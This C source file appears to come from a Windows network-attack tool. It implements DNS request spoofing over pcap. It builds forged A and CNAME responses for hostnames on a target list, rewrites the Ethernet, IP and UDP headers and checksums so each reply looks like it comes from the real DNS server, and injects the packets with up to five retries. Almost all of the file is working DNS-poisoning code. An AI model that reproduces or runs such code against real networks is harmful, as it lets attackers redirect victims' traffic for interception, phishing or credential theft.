
#include <stdio.h>
#include <pcap.h>
#include <excpt.h>
#include <Windows.h>

#include "DnsPoisoning.h"
#include "DnsForge.h"
#include "DnsHelper.h"
#include "DnsRequestSpoofing.h"
#include "LinkedListSpoofedDNSHosts.h"
#include "DnsStructs.h"
#include "Logging.h"
#include "NetworkHelperFunctions.h"

extern PHOSTNODE gDnsSpoofingList;


BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PPOISONING_DATA spoofingRecord, char *srcIp, char *dstIp)
{
  BOOL retVal = FALSE;
  unsigned char *spoofedDnsResponse = NULL;
  int basePacketSize = sizeof(ETHDR) + sizeof(IPHDR) + sizeof(UDPHDR);
  PDNS_HEADER dnsBasicHdr = (PDNS_HEADER) (rawPacket + basePacketSize);
  PRAW_DNS_DATA responseData = NULL;
  int counter = 0;  

  // Create DNS response data block
  if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_A)
  {
//LogMsg(DBG_DEBUG, "Request DNS poisoning: ReqHost:%s, Rule HostName:%s/HostPattern:%s -> SpoofedTo:A IP:%s", spoofingRecord->HostnodeToSpoof->Data.HostName, 
//  spoofingRecord->HostnodeToSpoof->Data.HostNameWithWildcard, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp);
    responseData = CreateDnsResponse_A(spoofingRecord->HostnameToResolve, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
  }
  else if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_CNAME)
  {
    LogMsg(DBG_DEBUG, "Request DNS poisoning: ReqHost:%s, Rule HostName:%s/HostPattern:%s -> SpoofedTo:CNAME:%s A:%s", spoofingRecord->HostnodeToSpoof->Data.HostName,
      spoofingRecord->HostnodeToSpoof->Data.HostNameWithWildcard, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp);

    LogMsg(DBG_DEBUG, "DnsRequestSpoofing(): Data.HostName=%s, Data.CnameHost=%s, Data.SpoofedIp=%s, Data.TTL=%lu", spoofingRecord->HostnodeToSpoof->Data.HostName, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
    
    responseData = CreateDnsResponse_CNAME(spoofingRecord->HostnameToResolve, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
  }
  
  if (responseData == NULL)
  {
    retVal = FALSE;
    goto END;
  }
  
  if ((spoofedDnsResponse = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, basePacketSize + responseData->dataLength)) == NULL)
  {
    retVal = FALSE;
    goto END;
  }
  
  CopyMemory(spoofedDnsResponse, rawPacket, basePacketSize);
  CopyMemory(spoofedDnsResponse + basePacketSize, responseData->data, responseData->dataLength);

  // Adjust and prepare data on OSI layer 2 to 4
  FixNetworkLayerData4Request(spoofedDnsResponse, responseData);
  
  // Keep sending the crafted dns reply packet to client till max 5 times if not successful
  for (counter = 5; counter > 0; counter--) 
  {
    int funcRetVal = -2;
    if ((funcRetVal = pcap_sendpacket(deviceHandle, (unsigned char *)spoofedDnsResponse, basePacketSize + responseData->dataLength)) != 0)
    {
      LogMsg(DBG_HIGH, "%2d Request DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x",
        counter, funcRetVal, spoofingRecord->HostnodeToSpoof->Data.HostName, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, deviceHandle);
      retVal = FALSE;
    }
    else 
    {
      retVal = TRUE;
      break;
    }
  }

END:
  if (spoofedDnsResponse != NULL)
  {
    HeapFree(GetProcessHeap(), 0, spoofedDnsResponse);
  }

  if (responseData != NULL && responseData->data != NULL)
  {
    HeapFree(GetProcessHeap(), 0, responseData->data);
  }

  return retVal;
}


void FixNetworkLayerData4Request(unsigned char * data, PRAW_DNS_DATA responseData)
{
  int etherPacketSize = sizeof(ETHDR);
  int ipPacketSize = sizeof(IPHDR);
  int udpPacketSize = sizeof(UDPHDR);
  PETHDR ethrHdr = (PETHDR)data;
  PIPHDR ipHdr = (PIPHDR)(data + etherPacketSize);
  PUDPHDR udpHdr = (PUDPHDR)(data + etherPacketSize + ipPacketSize);
  PDNS_HEADER dnsBasicHdr = NULL;
  unsigned short dstPort = 0;
  unsigned short srcPort = 0;
  unsigned char dstMacBin[BIN_MAC_LEN];
  unsigned char srcMacBin[BIN_MAC_LEN];
  unsigned char srcIpBin[BIN_IP_LEN];
  unsigned char dstIpBin[BIN_IP_LEN];
  char srcIpStr[128];
  char dstIpStr[128];
  PUDP_PSEUDO_HDR udpPseudoHdr;
  int basePacketSize = etherPacketSize + ipPacketSize + udpPacketSize;

  // 1. Copy source and destination MAC addresses
  CopyMemory(dstMacBin, ethrHdr->ether_dhost, BIN_MAC_LEN);
  CopyMemory(srcMacBin, ethrHdr->ether_shost, BIN_MAC_LEN);

  // 2. Copy source and destination IP addresses  
  CopyMemory(dstIpBin, &ipHdr->daddr, BIN_IP_LEN);
  CopyMemory(srcIpBin, &ipHdr->saddr, BIN_IP_LEN);

  // 3. Copy src(client) and dest(dns server) port  
  dstPort = udpHdr->dport;	
  srcPort = udpHdr->sport;
  dnsBasicHdr = (PDNS_HEADER)(data + basePacketSize);
  
  // 4. Adjust OSI layer 2 to 4
  ethrHdr = (PETHDR)data;
  ipHdr = (PIPHDR)(data + etherPacketSize);
  udpHdr = (PUDPHDR)(data + etherPacketSize + ipPacketSize);

  CopyMemory(ethrHdr->ether_dhost, srcMacBin, BIN_MAC_LEN);
  CopyMemory(ethrHdr->ether_shost, dstMacBin, BIN_MAC_LEN);

  CopyMemory(&ipHdr->daddr, &srcIpBin, BIN_IP_LEN);
  CopyMemory(&ipHdr->saddr, &dstIpBin, BIN_IP_LEN);

  CopyMemory(&udpHdr->sport, &dstPort, sizeof(dstPort));
  CopyMemory(&udpHdr->dport, &srcPort, sizeof(srcPort));

  int ipPayloadSize = sizeof(IPHDR) + sizeof(UDPHDR) + responseData->dataLength; 

  // IP header 
  ipHdr->identification = htons((unsigned short)GetCurrentProcessId()); //packet identification=process ID
  ipHdr->ver_ihl = 0x45;	//version of IP header = 4
  ipHdr->tos = 0x00;		//type of service
  ipHdr->flags_fo = htons(0x0000);
  ipHdr->ttl = 0xff; 	//time to live  
  ipHdr->tlen = htons(ipPayloadSize);
  ipHdr->checksum = 0;
  ipHdr->checksum = in_cksum((u_short *)ipHdr, ipPacketSize);

  // UDP header
  udpHdr->ulen = htons(sizeof(UDPHDR) + responseData->dataLength);
  udpHdr->checksum = 0;

  // UDP pseudo header checksum calculation
  char tempDataBuffer[512];
  ZeroMemory(&tempDataBuffer, sizeof(tempDataBuffer));
  CopyMemory(tempDataBuffer + sizeof(UDP_PSEUDO_HDR), (unsigned char *)udpHdr, sizeof(UDPHDR) + responseData->dataLength);  
  udpPseudoHdr = (PUDP_PSEUDO_HDR)tempDataBuffer;
  udpPseudoHdr->saddr = ipHdr->saddr;
  udpPseudoHdr->daddr = ipHdr->daddr;
  udpPseudoHdr->unused = 0;
  udpPseudoHdr->protocol = IP_PROTO_UDP;
  udpPseudoHdr->udplen = htons(sizeof(UDPHDR) + responseData->dataLength);

  // UDP header checksum
  udpHdr->checksum = in_cksum((unsigned short *) udpPseudoHdr, udpPacketSize + responseData->dataLength + sizeof(UDP_PSEUDO_HDR));
  
  ZeroMemory(srcIpStr, sizeof(srcIpStr));
  ZeroMemory(dstIpStr, sizeof(dstIpStr));
  snprintf((char *)srcIpStr, sizeof(srcIpStr) - 1, "%i.%i.%i.%i", srcIpBin[0], srcIpBin[1], srcIpBin[2], srcIpBin[3]);
  snprintf((char *)dstIpStr, sizeof(dstIpStr) - 1, "%i.%i.%i.%i", dstIpBin[0], dstIpBin[1], dstIpBin[2], dstIpBin[3]);
  LogMsg(DBG_DEBUG, "FixNetworkLayerData4Request(): %s:%d -> %s:%d udpDataLength=%d",
    srcIpStr, ntohs(srcPort), dstIpStr, ntohs(dstPort), ntohs(udpHdr->ulen));
}


PPOISONING_DATA DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
{
  PETHDR ethrHdr = (PETHDR)dataParam;
  PPOISONING_DATA retVal = NULL;
  PHOSTNODE tmpNode = NULL;
  u_char hostname[256];
  
  if (gDnsSpoofingList->next == NULL || 
      dataParam == NULL || 
      htons(ethrHdr->ether_type) != ETHERTYPE_IP)
  {
    goto END;
  }  

  if (GetHostnameFromPcapDnsPacket(dataParam, hostname, 255) == FALSE)
  {
    goto END;
  }

  if ((retVal = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(POISONING_DATA))) == NULL)
  {
    goto END;
  }

  strncpy(retVal->HostnameToResolve, hostname, sizeof(retVal->HostnameToResolve) - 1);
  if ((tmpNode = GetNodeByHostname(gDnsSpoofingList, hostname)) != NULL)
  {
    retVal->HostnodeToSpoof = tmpNode;
  }
  
END:

  if (tmpNode == NULL &&
      retVal != NULL)
  {
    HeapFree(GetProcessHeap(), 0, retVal);
    retVal = NULL;
  }

  return retVal;
}
